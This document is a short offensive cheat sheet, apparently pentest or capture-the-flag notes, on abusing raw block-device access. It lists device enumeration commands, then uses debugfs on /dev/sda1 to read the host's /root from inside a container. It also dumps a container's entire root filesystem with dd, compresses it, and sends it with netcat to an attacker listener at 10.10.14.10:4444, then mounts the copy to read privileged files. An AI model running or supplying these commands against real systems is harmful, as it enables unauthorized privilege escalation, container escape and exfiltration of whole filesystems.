Basic

# Show devices
lsblk

# Device attributes
blkid

# Show swap on blk
swapon -s

# Filesystem info
cat /etc/fstab

Abuse #1: Read host’s filesystem from container (root)

# Open target device
debugfs /dev/sda1

# Exploit
ls /root

Abuse #2: Read container’s filesystem from host

# Show LVM mappings
ls -l /dev/mapper/

# In our local machine
nc -lvnp 4444 > dm-0.gz

# Exfil filesystem (target container rootfs, e.g. dm-0)
dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444

# Extract dm-0
gunzip dm-0.gz

# Mount the filesystem
sudo mount dm-0-orig /mnt/ 

# Privilege read
ls /mnt/root/

Note: can take a long time to transfer
